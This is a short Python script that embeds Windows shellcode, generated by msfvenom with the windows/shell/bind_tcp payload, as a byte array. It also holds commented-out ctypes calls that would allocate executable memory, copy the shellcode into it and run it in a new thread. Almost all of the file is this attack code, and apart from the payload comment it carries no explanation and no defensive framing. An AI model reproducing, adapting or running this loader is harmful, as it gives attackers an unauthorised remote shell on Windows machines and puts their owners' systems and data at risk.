#!/usr/bin/python
import ctypes
#ShellCode
# msfvenom -p windows/shell/bind_tcp -e none
shellcode = bytearray(
"\xbb\x05\x71\x96\xd6\xdb\xd6\xd9\x74\x24\xf4\x5a\x2b"
"\xc9\xb1\x54\x31\x5a\x13\x83\xc2\x04\x03\x5a\x0a\x93"
"\x63\x2a\xfc\xd1\x8c\xd3\xfc\xb5\x05\x36\xcd\xf5\x72"
"\x32\x7d\xc6\xf1\x16\x71\xad\x54\x83\x02\xc3\x70\xa4"
"\xa3\x6e\xa7\x8b\x34\xc2\x9b\x8a\xb6\x19\xc8\x6c\x87"
"\xd1\x1d\x6c\xc0\x0c\xef\x3c\x99\x5b\x42\xd1\xae\x16"
"\x5f\x5a\xfc\xb7\xe7\xbf\xb4\xb6\xc6\x11\xcf\xe0\xc8"
"\x90\x1c\x99\x40\x8b\x41\xa4\x1b\x20\xb1\x52\x9a\xe0"
"\x88\x9b\x31\xcd\x25\x6e\x4b\x09\x81\x91\x3e\x63\xf2"
"\x2c\x39\xb0\x89\xea\xcc\x23\x29\x78\x76\x88\xc8\xad"
"\xe1\x5b\xc6\x1a\x65\x03\xca\x9d\xaa\x3f\xf6\x16\x4d"
"\x90\x7f\x6c\x6a\x34\x24\x36\x13\x6d\x80\x99\x2c\x6d"
"\x6b\x45\x89\xe5\x81\x92\xa0\xa7\xcd\x57\x89\x57\x0d"
"\xf0\x9a\x24\x3f\x5f\x31\xa3\x73\x28\x9f\x34\x74\x03"
"\x67\xaa\x8b\xac\x98\xe2\x4f\xf8\xc8\x9c\x66\x81\x82"
"\x5c\x87\x54\x3e\x58\x1f\x1f\xac\x09\x08\xf7\xd0\xcd"
"\xa7\x54\x5c\x2b\x97\x34\x0e\xe4\x57\xe5\xee\x54\x3f"
"\xef\xe0\x8b\x5f\x10\x2b\xa4\xf5\xff\x82\x9c\x61\x99"
"\x8e\x57\x10\x66\x05\x12\x12\xec\xac\xe2\xdc\x05\xc4"
"\xf0\x08\x74\x26\x09\xc8\x1d\x26\x63\xcc\xb7\x71\x1b"
"\xce\xee\xb6\x84\x31\xc5\xc4\xc3\xcd\x98\xfc\xb8\xfb"
"\x0e\x41\xd7\x03\xdf\x41\x27\x55\xb5\x41\x4f\x01\xed"
"\x11\x6a\x4e\x38\x06\x27\xda\xc3\x7f\x9b\x4d\xac\x7d"
"\xc2\xb9\x73\x7d\x21\xba\x74\x81\xb7\x9e\xdc\xea\x47"
"\x9e\xdc\xea\x2d\x1e\x8d\x82\xba\x31\x22\x63\x42\x98"
"\x6b\xeb\xc9\x4c\xd9\x8a\xce\x45\xbf\x12\xce\x69\x64"
"\x42\x41\x8e\x9b\x6b\xa3\xb3\x4d\x52\xd1\xf4\x4d\xe1"
"\xea\x4f\xf3\x40\x61\xaf\xa7\x93\xa0"
)

# ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
 
# buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
 
# ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr),buf,ctypes.c_int(len(shellcode)))
 
# ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_int(ptr),ctypes.c_int(0),ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
 
# ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht),ctypes.c_int(-1))

